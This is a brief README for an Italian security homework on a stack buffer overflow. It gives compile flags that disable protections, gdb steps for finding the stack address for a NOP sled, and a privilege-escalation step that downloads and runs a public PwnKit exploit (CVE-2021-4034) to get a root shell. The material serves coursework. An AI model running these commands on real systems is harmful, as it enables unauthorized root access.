## FILE PER Homework di sicurezza informatica

Remember to check with checksec the attributes of main.o and disable ASLR!

```
gcc -o main.o main.c -fno-stack-protector -z execstack
```

Guardo com'è strutturata la stack e becco l'indirizzo iniziale di stack

disas oflow
(set breakpoint after strcpy)
run $(python3 -c "print(b'A'*30)")
x/200xb $esp

L'indirizzo di inizio stack 0xbfffee2c (verrà poi scritto little-endian e aumentato leggermente per puntare alla nop sled)


Per effettuare il privilege escalation è possibile utilizzare 

```
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit32 -o PwnKit
chmod +x ./PwnKit
./PwnKit # interactive shell
./PwnKit 'id' # single command
```

The source for this attack is [HERE](https://github.com/ly4k/PwnKit), and it's based on [CVE-2021-4034](https://nvd.nist.gov/vuln/detail/cve-2021-4034)
La relazione si trova nel form google nel link

